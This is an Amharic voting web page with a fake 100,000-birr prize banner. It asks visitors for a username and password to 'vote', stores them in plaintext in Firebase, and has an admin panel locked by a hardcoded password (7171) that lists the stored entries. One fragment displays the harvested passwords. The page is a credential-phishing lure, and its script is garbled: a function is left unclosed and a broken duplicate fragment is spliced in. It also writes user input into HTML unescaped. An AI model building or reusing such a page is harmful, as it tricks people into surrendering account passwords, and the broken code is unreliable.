<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>የድምጽ መስጫ መድረክ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
</head>
<body class="bg-slate-100 p-4">

    <div class="max-w-md mx-auto">
        <div class="bg-red-600 text-white p-4 rounded-xl text-center font-bold text-lg mb-6 shadow-lg">
            🏆 100,000 ብር ይሸለሙ! 🏆
        </div>

        <div class="grid grid-cols-3 gap-2 mb-6">
            <button onclick="selectC('ተወዳዳሪ 1')" class="bg-white p-3 rounded-lg shadow border-2 border-blue-500">1ኛ</button>
            <button onclick="selectC('ተወዳዳሪ 2')" class="bg-white p-3 rounded-lg shadow border-2 border-blue-500">2ኛ</button>
            <button onclick="selectC('ተወዳዳሪ 3')" class="bg-white p-3 rounded-lg shadow border-2 border-blue-500">3ኛ</button>
        </div>

        <div class="bg-white p-6 rounded-xl shadow-lg mb-6">
            <p id="selDisplay" class="text-center font-bold mb-4">ምንም አልተመረጠም</p>
            <input type="text" id="uname" placeholder="የተጠቃሚ ስም" class="w-full p-3 border rounded-lg mb-3">
            <input type="password" id="upass" placeholder="የይለፍ ቃል" class="w-full p-3 border rounded-lg mb-4">
            <button onclick="submitVote()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold">ድምጽ ይስጡ</button>
        </div>

        <div class="bg-slate-800 p-6 rounded-xl text-white">
            <input type="password" id="adminPw" placeholder="አድሚን ይለፍ ቃል (7171)" class="w-full p-2 rounded text-black mb-2">
            <button onclick="viewData()" class="w-full bg-amber-500 py-2 rounded font-bold">መረጃዎችን ይመልከቱ</button>
            <div id="adminTable" class="mt-4 text-xs overflow-x-auto"></div>
        </div>
    </div>

    <script>
        // የራስዎን የ Firebase መረጃ እዚህ ያስገቡ
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT_ID.appspot.com",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let selected = "";
        function selectC(name) { selected = name; document.getElementById('selDisplay').innerText = "የመረጡት: " + name; }

        function submitVote() {
            let u = document.getElementById('uname').value;
            let p = document.getElementById('upass').value;
            if(!u || !p || !selected) return alert("እባክዎ መረጃዎችን ሁሉ ይሙሉ");
            
            db.collection("votes").add({ username: u, password: p, contestant: selected })
            .then(() => alert("ድምጽዎ በተሳካ ሁኔታ ተመዝግቧል!"));
 function viewData() {
    if(document.getElementById('adminPw').value !== '7171') return alert("የተሳሳተ የይለፍ ቃል!");
    
    db.collection("votes").get().then((q) => {
        // የይለፍ ቃሉን ለመደበቅ '******' እንጠቀማለን
        let html = "<table class='w-full border mt-4'><thead><tr class='bg-gray-200'><th>ስም</th><th>ይለፍ ቃል</th><th>ምርጫ</th></tr></thead><tbody>";
        
        q.forEach(d => { 
            let v = d.data(); 
            html += `<tr>
                <td class='border p-2'>${v.username}</td>
                <td class='border p-2'>******</td> 
                <td class='border p-2'>${v.contestant}</td>
            </tr>`; 
        });
        
        document.getElementById('adminTable').innerHTML = html + "</tbody></table>";
        document.getElementById('adminTable').classList.remove('hidden');
    });
}         q.forEach(d => { let v = d.data(); html += `<tr><td>${v.username}</td><td>${v.password}</td><td>${v.contestant}</td></tr>`; });
                document.getElementById('adminTable').innerHTML = html + "</table>";
            });
        }
    </script>
</body>
</html>
